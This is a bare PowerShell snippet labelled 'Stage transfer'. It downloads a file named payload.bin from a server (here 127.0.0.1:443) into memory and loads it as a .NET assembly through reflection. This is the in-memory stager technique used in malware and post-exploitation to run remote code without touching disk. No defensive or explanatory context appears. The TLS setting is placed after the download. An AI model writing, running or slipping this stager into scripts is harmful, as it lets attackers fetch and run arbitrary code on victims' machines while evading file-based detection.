
<# Stage transfer #> $AssemblyBytes = (New-Object System.Net.WebClient).DownloadData("https://127.0.0.1:443/payload.bin"); [Reflection.Assembly]::Load($AssemblyBytes); [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
